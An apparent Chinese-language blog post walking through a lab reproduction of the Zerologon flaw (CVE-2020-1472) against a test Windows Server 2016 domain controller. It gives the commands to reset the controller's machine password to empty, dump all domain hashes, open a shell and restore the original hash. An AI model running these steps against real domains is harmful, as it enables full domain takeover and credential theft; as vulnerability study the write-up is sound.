<!DOCTYPE html>
<html lang="en" >
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Ye" />
	
	
	
	<title>CVE-2020-1472 NETLOG复现 ｜ 葉落無聲</title>
	
    
    
    <meta name="description" content="2020年9月11日，安全公司Secura发布了公告，披露了Microsoft在2020年8月修补的漏洞细节（CVE-2020-1472）。该漏洞也称为“Zerologon”，CVSS评分为10.0，号称3秒撸域控，危害严重。攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。
" />
    

    
    
    <meta name="keywords" content=", , " />
    

	
    
    <link rel="shortcut icon" href="https://ye557.github.io/images/favicon.ico" />

    <link rel="stylesheet" type="text/css" media="screen" href="https://ye557.github.io/css/normalize.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://ye557.github.io/css/zozo.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://ye557.github.io/css/highlight.css" />

    
    
</head>

<body>
    <div class="main animate__animated animate__fadeInDown">
        <div class="nav_container animated fadeInDown">
    <div class="site_nav" id="site_nav">
        <ul>
            
            <li>
                <a href="/">Home</a>
            </li>
            
            <li>
                <a href="/posts/">Archive</a>
            </li>
            
            <li>
                <a href="/about/">About</a>
            </li>
            
        </ul>
    </div>
    <div class="menu_icon">
        <a id="menu_icon"><i class="ri-menu-line"></i></a>
    </div>
</div>
        <div class="header animated fadeInDown">
    <div class="site_title_container">
        <div class="site_title">
            <h1>
                <a href="https://ye557.github.io/">
                    <span>葉落無聲</span>
                </a>
            </h1>
        </div>
        <div class="description">
            <p class="sub_title">因緣實存不妄，物自性本空.</p>
            <div class="my_socials">
                
                
                <a href="#" title="facebook" target="_blank"><i class="ri-facebook-fill"></i></a>
                
                
                
                <a href="#" title="github" target="_blank"><i class="ri-github-fill"></i></a>
                
                
                
                <a href="#" title="instagram" target="_blank"><i class="ri-instagram-fill"></i></a>
                
                
                
                <a href="#" title="twitter" target="_blank"><i class="ri-twitter-fill"></i></a>
                
                
                
                <a href="#" title="weibo" target="_blank"><i class="ri-weibo-fill"></i></a>
                
                
                <a href="https://ye557.github.io/index.xml" type="application/rss+xml" title="rss" target="_blank"><i
                        class="ri-rss-fill"></i></a>
            </div>
        </div>
    </div>
</div>
        <div class="content">
            <div class="post_page">
                <div class="post animate__animated animate__fadeInDown">
                    <div class="post_title post_detail_title">
                        <h2><a href='/posts/cve-2020-1472-netlog%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/'>CVE-2020-1472 NETLOG复现</a></h2>
                        <span class="date">2020.09.22</span>
                    </div>
                    <div class="post_content markdown"><p>2020年9月11日，安全公司Secura发布了公告，披露了Microsoft在2020年8月修补的漏洞细节（CVE-2020-1472）。该漏洞也称为“Zerologon”，CVSS评分为10.0，号称3秒撸域控，危害严重。攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。</p>
<p>受影響的版本：</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)
</code></pre></div><h2 id="測試環境">測試環境</h2>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Windows Server 2016：192.168.0.117
Kali Linux: 192.168.1.76
</code></pre></div><h2 id="相關工具">相關工具</h2>
<ul>
<li>
<p><a href="https://github.com/SecuraBV/CVE-2020-147">zerologon_tester</a></p>
</li>
<li>
<p><a href="https://github.com/dirkjanm/CVE-2020-1472">exp下載地址</a></p>
</li>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket">impacket依賴</a></p>
</li>
</ul>
<h2 id="復現過程">復現過程</h2>
<p>通過GIT下載相關工具</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/SecuraBV/CVE-2020-147
git clone https://github.com/dirkjanm/CVE-2020-1472
git clone https://github.com/SecureAuthCorp/impacket
</code></pre></div><p>安裝impacket包</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="n">setup</span><span class="o">.</span><span class="n">py</span> <span class="n">install</span>
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922160822.png" alt=""></p>
<p>通過zerologon_tester.py腳本檢測域控是否存在相關漏洞</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="n">zerologon_tester</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">dc</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="o">&gt;</span>
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922160957.png" alt=""></p>
<p>執行exp腳本需要傳遞主機名，主機名可通過<code>nbtstat -n</code> 查看</p>
<p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922161547.png" alt=""></p>
<p>通過EXP對漏洞進行利用，將域控密碼重置為空</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">python3 cve-2020-1472-exploit.py WIN-L0PQ5KP3NSK 192.168.0.117
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922161215.png" alt=""></p>
<p>重置為空後通過<code>impacket/examples</code>目錄下的secretsdump.py腳本讀取域控上的所有hash</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="err">域名稱</span><span class="o">/</span><span class="err">主機名</span>\<span class="err">$</span><span class="nd">@域控IP</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span>
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922161855.png" alt=""></p>
<p>獲取管理員hash之後，通過<code>wmiexec.py</code>腳本連接到域控主機上獲取壹個shell</p>
<p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922162047.png" alt=""></p>
<p>由於域控密碼重置為空之後，域控服務器重啟會產生脫域，DNS無法使用的情況，需要恢復原來的hash或是使域控hash不為空。在windows運行的時候，sam文件會被內核占用無法操作，所以重置域控密碼為空機器不重啟的情況下sam文件會保存之前的hash，恢復原來的hash可以通過備份註冊表讀取sam中的hash進行還原。</p>
<p>備份<code>HKLM</code>下的system，security和sam</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
reg save HKLM\SAM sam.save
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922163130.png" alt=""></p>
<p>然後通過<code>get</code>下載到本地</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">get system.save
get sam.save
get security.save
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922163003.png" alt=""></p>
<p>查看當前目錄下是否存在這三個文件</p>
<p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922162904.png" alt=""></p>
<p>備份註冊表後會在當前目錄下生成三個文件，刪除這三個文件</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">del /f system.save
del /f sam.save
del /f security.save
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922165547.png" alt=""></p>
<p>通過<code>secretsdump.py</code>讀取SAM文件中的hash值，<code>$MACHINE.ACC</code>為原本的hash</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922163441.png" alt=""></p>
<p>最後，通過<code>reinstall_original_pw.py</code>還原hash值</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="n">reinstall_original_pw</span><span class="o">.</span><span class="n">py</span> <span class="err">主機名</span> <span class="n">IP地址</span> <span class="nb">hash</span>
</code></pre></div><p><img src="C:%5CUsers%5CYvn5n%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200922164711041.png" alt=""></p>
<p>最後再檢測壹下，成功還原hash</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">secretsdump.py 域名/administrator:密碼@ip地址 -just-dc-user &#39;主機名$&#39;
</code></pre></div><p><img src="https://blog-1300356561.cos.ap-guangzhou.myqcloud.com/CVE-2020-1472/20200922164942.png" alt=""></p></div>
                    <div class="post_footer">
                        
                    </div>
                </div>
                
                
                <div class="doc_comments"></div>
                
            </div>
        </div>
    </div>
    <a id="back_to_top" href="#" class="back_to_top"><i class="ri-arrow-up-s-line"></i></a>
    <footer class="footer">
    <div class="powered_by">
        <a href="https://varkai.com">Designed by VarKai,</a>
        <a href="http://www.gohugo.io/">Proudly published with Hugo</a>
    </div>

    <div class="footer_slogan">
        <span></span>
    </div>
</footer>
    <script src="https://ye557.github.io/js/jquery-3.5.1.min.js"></script>
<link href="https://ye557.github.io/css/fancybox.min.css" rel="stylesheet">
<script src="https://ye557.github.io/js/fancybox.min.js"></script>
<script src="https://ye557.github.io/js/zozo.js"></script>


<script type="text/javascript" async
    src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
        MathJax.Hub.Config({
            tex2jax: {
                inlineMath: [['$', '$'], ['\\(', '\\)']],
                displayMath: [['$$', '$$'], ['\[\[', '\]\]']],
                processEscapes: true,
                processEnvironments: true,
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
                TeX: {
                    equationNumbers: { autoNumber: "AMS" },
                    extensions: ["AMSmath.js", "AMSsymbols.js"]
                }
            }
        });

        MathJax.Hub.Queue(function () {
            
            
            
            var all = MathJax.Hub.getAllJax(), i;
            for (i = 0; i < all.length; i += 1) {
                all[i].SourceElement().parentNode.className += ' has-jax';
            }
        });
    </script>

<style>
    code.has-jax {
        font: inherit;
        font-size: 100%;
        background: inherit;
        border: inherit;
        color: #515151;
    }
</style>



</body>

</html>